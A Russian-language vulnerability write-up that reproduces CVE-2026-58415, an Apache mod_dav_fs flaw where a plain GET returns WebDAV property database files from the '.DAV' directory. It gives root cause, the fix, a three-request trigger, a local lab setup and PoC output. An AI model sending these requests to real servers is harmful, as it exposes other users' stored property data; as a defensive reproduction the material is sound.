# CVE-2026-58415: разбор и воспроизведение

## 1. Сводка

| Параметр | Значение |
|---|---|
| Идентификатор | CVE-2026-58415 |
| Компонент | Apache HTTP Server, mod_dav_fs |
| Класс | доступ к служебным файлам состояния WebDAV |
| Затронуто | 2.4.0 по 2.4.68 |
| Исправлено | 2.4.69, ветка 2.4.x ревизия r1938668 |
| Оценка Apache | low |
| Отчёт вендору | 2026-06-24 |
| Публикация | 2026-10-01 |
| Первооткрыватели | 이지웅 (kimchunbok), sungbyeongchan |

Репозиторий содержит независимое воспроизведение, а не оригинальный отчёт.

## 2. Причина

mod_dav_fs хранит свойства WebDAV в служебном каталоге `.DAV` внутри обслуживаемого дерева. Имя файла базы свойств собирается из каталога ресурса и имени ресурса.

`modules/dav/fs/dbm.c`, `dav_dbm_open()`:

```c
(void) dav_fs_dir_file_name(resource, &dirpath, &fname);
...
pathname = apr_pstrcat(p, dirpath, "/" DAV_FS_STATE_DIR "/",
                          fname ? fname : DAV_FS_STATE_FILE_FOR_DIR,
                          NULL);
```

То есть для ресурса `secret.txt` в каталоге `/` база лежит в `/.DAV/secret.txt`, а конкретные файлы зависят от драйвера DBM. В наших прогонах это `secret.txt.pag` и `secret.txt.dir`.

Проблема в том, что `dav_fs_get_resource()` отказывает только тем запросам, которые mod_dav проводит через провайдер репозитория. GET к провайдеру не идёт: mod_dav_fs выставляет `handle_get` в false, фиксапы mod_dav отказываются, и запрос обслуживает обычный статический обработчик. Файл базы свойств отдаётся как обычный файл.

Это дословно описано в комментарии к исправлению, коммит r1938666:

```
dav_fs_get_resource() refuses the state directory, but only requests
which mod_dav routes through the repository provider ever reach it.
GET is not one of those: mod_dav_fs sets handle_get to false, so
dav_fixups() declines and the default handler serves the file straight
off the filesystem, property database and all.  Deny the state directory
here instead, for every method, wherever mod_dav_fs is the provider.
```

Исправление добавляет `dav_fs_fixups()`, который проверяет путь через `dav_fs_is_state_path()` и отклоняет любой метод, если путь указывает на `.DAV` или файл внутри него. На исправленной сборке ответ становится `403`.

## 3. Что именно утекает

База свойств содержит мёртвые свойства ресурса: имена, значения и таблицу пространств имён. В нашем прогоне в файле на смещении 978 лежит:

```
LEAKMARK123 0 1:token 0 0 04 0 0 02 DAV
```

То есть значение свойства, имя свойства и служебные поля. Никакой аутентификации для этого GET не нужно: проверяется только доступ к самому файлу в дереве.

## 4. Триггер

1. `PUT /leakdemo.txt` с произвольным телом. Нужен DAV-каталог с правом записи.
2. `PROPPATCH /leakdemo.txt` с мёртвым свойством, например `<Z:token>LEAKMARK123</Z:token>`.
3. `GET /.DAV/leakdemo.txt.pag`.

На уязвимой версии шаг 3 даёт 200 и содержимое базы. На исправленной 403.

Важно: шаг 1 и 2 моделируют ситуацию «автор ресурса». Для самого чтения они не нужны, если в каталоге уже есть базы других авторов. Достаточно знать или угадать имя ресурса и выполнить GET.

## 5. Стенд

```bash
sh lab/build.sh 2.4.68 8094
sh lab/build.sh 2.4.69 8105
```

Скрипт собирает указанную версию из официального архива, ставит в `lab/install-<версия>` и генерирует конфиг `lab/httpd-<версия>.conf` с включённым DAV и правом записи в `DocumentRoot`.

Запуск:

```bash
lab/install-2.4.68/bin/httpd -f lab/httpd-2.4.68.conf -k start
lab/install-2.4.69/bin/httpd -f lab/httpd-2.4.69.conf -k start
```

## 6. Воспроизведение

```bash
./davleak.py -u http://127.0.0.1:8094 -n leakdemo.txt -v LEAKMARK123
```

Уязвимая версия:

```
PUT /leakdemo.txt -> 201
PROPPATCH /leakdemo.txt -> 207
GET /.DAV/leakdemo.txt.pag -> 200, байт 1024, маркер найден
итог: свойство прочитано из /.DAV/leakdemo.txt.pag
смещение в файле: 1004
окно байтов: 6e3a6c65616b004d45544144415441004c45414b4d41524b31323300313a746f6b656e00
```

Исправленная версия:

```
GET /.DAV/leakdemo.txt.pag -> 403, байт 239, маркер нет
итог: служебный файл недоступен, цель не уязвима или DAV закрыт
```

## 7. Замечания

- Ответ 404 вместо 403 тоже означает, что цель исправлена или путь не совпал: проверяйте, что ресурс действительно создан и что каталог обслуживается mod_dav_fs.
- Драйвер DBM может быть разным. Если маркера нет в `.pag`, смотрите `.dir`. Скрипт проверяет оба.
- Класс ошибки не про переполнение, а про неправильную маршрутизацию запроса: служебный каталог не должен обслуживаться статикой в принципе.
- Оценка Apache для этой записи в advisory: low. Это отражает необходимость знать имя ресурса и наличие DAV-каталога, а не отсутствие утечки.

## 8. Ссылки

- Advisory Apache: https://httpd.apache.org/security/vulnerabilities_24.html
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-58415
- Исправление: r1938668 в ветке 2.4.x, исходный коммит trunk r1938666
- Исходники: `modules/dav/fs/mod_dav_fs.c`, `modules/dav/fs/repos.c`, `modules/dav/fs/dbm.c`
